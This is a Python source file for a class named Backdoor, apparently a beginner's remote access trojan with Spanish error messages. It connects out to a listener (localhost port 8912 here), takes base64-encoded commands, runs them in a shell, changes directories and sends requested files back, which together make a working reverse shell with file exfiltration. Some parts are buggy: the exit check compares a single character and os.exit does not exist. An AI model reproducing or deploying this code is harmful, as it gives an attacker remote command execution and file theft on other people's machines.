from multiprocessing.sharedctypes import Value
import socket, subprocess, os
import json
import base64
from typing import Type


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket. socket(socket.AF_INET, socket. SOCK_STREAM)
        self.connection.connect((ip, port))

    def exec_command(self, command):
        return subprocess.getoutput(command)


    def ser_send(self,data):
         
        json_data = base64.b64encode(data)
        self.connection.send(json_data)
       

    def recive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(32768)
                json_data = base64.b64decode(json_data)
                json_data = json_data.decode("utf-8")
                print(json_data)

                return json_data
            except ValueError:
                continue

    def read_file(self,path):
        print(path)
        try:
            with open(path, "rb") as file:
                print(path)
                return file.readlines()
        except TypeError:
            return "no se ha podido descargar el archivo"
        except FileNotFoundError:
            return "el archivo no existe" 

    def change_dir(self,path):
        print("PATH: " + path)
        try:
            os.chdir(path)
            return path
        except FileNotFoundError:
            return "no se ha encontrado la ruta o el archivo: " + path


    def run(self):
        while True:
            command = self.recive()
            print("command: " + str(command))
            if command[0] == "exit":
                self.connection.close()
            elif "cd" in command and len(command) > 2:
                try:
                    command = command.split(" ") 
                    result = self.change_dir(command[1])
                    self.ser_send(result.encode("utf-8"))
                except:
                    continue 
            elif "download" in command and len(command) > 2:
                command = command.split(" ")
                file = self.read_file(command[1])
                self.ser_send(file)
            else:
                result = self.exec_command(command)
                self.ser_send(result.encode("utf-8"))

        self.connection.close()
        os.exit()


puert = Backdoor("localhost", 8912)
puert.run()
